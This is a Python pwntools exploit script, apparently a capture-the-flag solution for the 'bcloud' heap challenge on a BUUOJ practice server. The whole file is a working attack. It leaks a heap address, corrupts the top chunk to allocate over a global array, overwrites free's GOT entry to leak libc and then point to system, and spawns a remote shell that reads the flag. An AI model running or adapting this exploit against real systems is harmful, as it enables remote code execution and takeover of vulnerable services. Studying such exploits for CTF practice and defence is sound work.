#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/14 10:22:36
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'i386'
if debug:
    if context.arch == amd64:
        # sh = process(['./bcloud'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
		sh = process('./bcloud')
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        # one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        # sh = process(['./bcloud'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
		sh = process('./bcloud')
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        # one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 26317
    sh = remote(IP,port)
    # libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('bcloud')
libc = ELF("/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so")
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil("option--->>\n")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Input the length of the note content:\n")
    sh.sendline(str(size))
    sh.recvuntil("Input the content:\n")
    sh.send(content)

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Input the id:\n")
    sh.sendline(str(idx))
    sh.recvuntil("Input the new content:")
    sh.sendline(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("Input the id:\n")
    sh.sendline(str(idx))
free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
heap_array_addr = 0x0804B120
name = 'a' * 0x40
org = 'a' * 0x40
host = p32(0xffffffff)
sh.recvuntil("Input your name:\n")
sh.send(name)
sh.recvuntil('Hey ' + 'a'*0x40)
heap_base = u32(sh.recv(4)) 
log.info("heap_base=>{}".format(hex(heap_base)))
sh.recvuntil("Org:\n")
sh.send(org)
sh.recvuntil("Host:\n")
sh.sendline(host)
offset = heap_array_addr  - heap_base  - 0x10 - 0xd0
add(offset,'') 
add(0x18,'\n') 
payload = p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + '/bin/sh\x00'
edit(1,payload)
# debug()
edit(1,p32(puts_plt) + '\n')
dele(2)
puts_addr = u32(sh.recv(4))
log.info("puts_addr=>{}".format(hex(puts_addr)))
libc_base = puts_addr - libc.sym['puts']
log.info("libc_base=>{}".format(hex(libc_base)))
system_addr = libc_base + libc.sym['system']
log.info("system_addr=>{}".format(hex(system_addr)))
edit(1,p32(system_addr) + '\n')

dele(3)
sh.sendline("cat flag")
# debug()
sh.interactive()
